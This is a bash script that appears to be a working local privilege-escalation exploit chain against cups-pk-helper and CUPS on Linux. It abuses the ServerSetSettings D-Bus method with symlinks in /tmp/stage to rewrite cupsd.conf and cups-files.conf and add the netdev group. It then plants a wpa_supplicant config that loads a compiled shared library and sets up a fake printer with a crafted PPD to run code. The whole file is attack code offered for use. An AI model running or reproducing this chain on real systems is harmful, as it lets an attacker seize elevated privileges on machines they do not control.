restart_service() {
    echo "Restart Service..."
    gdbus call --system \
        --dest org.opensuse.CupsPkHelper.Mechanism \
        --object-path / \
	--timeout 30000 \
        --method org.opensuse.CupsPkHelper.Mechanism.ServerSetSettings \
        "{'IdleExitTimeout': '60'}"

    gdbus call --system \
        --dest org.opensuse.CupsPkHelper.Mechanism \
        --object-path / \
	--timeout 30000 \
        --method org.opensuse.CupsPkHelper.Mechanism.ServerSetSettings \
        "{'IdleExitTimeout': '60'}"
    sleep 2
}

stage_1() {
    mkdir -m 777 /tmp/stage
    ln -s /etc/cups/cupsd.conf /tmp/stage/cupsd.conf

    echo "Set Listen to /tmp/stage/cupsd.conf"
    gdbus call --system \
        --dest org.opensuse.CupsPkHelper.Mechanism \
        --object-path / \
        --method org.opensuse.CupsPkHelper.Mechanism.ServerSetSettings \
        "{'Listen': '/tmp/stage/cupsd.conf'}"

    echo "Restart Service..."
    gdbus call --system \
        --dest org.opensuse.CupsPkHelper.Mechanism \
        --object-path / \
	--timeout 30000 \
        --method org.opensuse.CupsPkHelper.Mechanism.ServerSetSettings \
        "{'IdleExitTimeout': '60'}"
    sleep 2

    echo "Restore Settings..."
    echo "Listen localhost:631" >> /etc/cups/cupsd.conf
    echo "Listen /run/cups/cups.sock" >> /etc/cups/cupsd.conf
    # ---------------------------------------
    # Stage 1 Clear
    # ---------------------------------------
}

stage_2() {
    echo "Set to Listen /tmp/stage/cups-files.conf"
    ln -s /etc/cups/cups-files.conf /tmp/stage/cups-files.conf
    echo "Listen /tmp/stage/cups-files.conf" >> /etc/cups/cupsd.conf

    restart_service

    echo "Append Group netdev"
    echo "Group netdev" >> /etc/cups/cups-files.conf
    
    restart_service
    # ---------------------------------------
    # Stage 2 Clear
    # ---------------------------------------
}

stage_3() {
    echo "Create wpa_conf"
    echo "opensc_engine_path=/tmp/stage/loadable.so" >> /tmp/stage/wpa_conf

    echo "Copy ./wpa.py to /tmp/stage/wpa.py"
    cp ./wpa.py /tmp/stage/wpa.py

    echo "Create loadable.so and Copy ./loadable.so to /tmp/stage/loadable.so"
    gcc -fPIC -shared -o loadable.so loadable.c
    cp loadable.so /tmp/stage/loadable.so

    echo "Copy ppd.ppd to /tmp/stage/ppd.ppd"
    cp ./ppd.ppd /tmp/stage/ppd.ppd

    echo "Create hello and Copy hello to /tmp/stage/hello"
    gcc -o hello hello.c
    cp ./hello /tmp/stage/hello

    chmod -R 777 /tmp/stage

    echo "Make New Printer..."
    lpadmin -p Fake_Printer -E -v file:/dev/null -P /tmp/stage/ppd.ppd

    echo "Run Command!"
    echo "Test print" | lp -d Fake_Printer
    # ---------------------------------------
    # Stage 3 Clear
    # ---------------------------------------
}

check_tools() {
    # Check gcc
    if ! command -v gcc &> /dev/null
    then
        echo "gcc is not installed. Please install it using: sudo apt install gcc"
        exit 1
    fi

    # Check python
    if ! command -v python3 &> /dev/null
    then
        echo "python3 is not installed. Please install it using: sudo apt install python3"
        exit 1
    fi

    if ! command -v gdbus &> /dev/null; then
        echo "gdbus is not installed. Please install it using: sudo apt install libglib2.0-bin"
        exit 1
    fi
}

# Main
check_tools
echo "Staging..."
echo -e "\e[31mEnter Stage1\e[0m"
stage_1

echo -e "\e[31mEnter Stage2\e[0m"
stage_2

echo -e "\e[31mEnter Stage3\e[0m"
stage_3

sleep 2
echo "Run Program!"
/tmp/stage/hello
echo "done..."
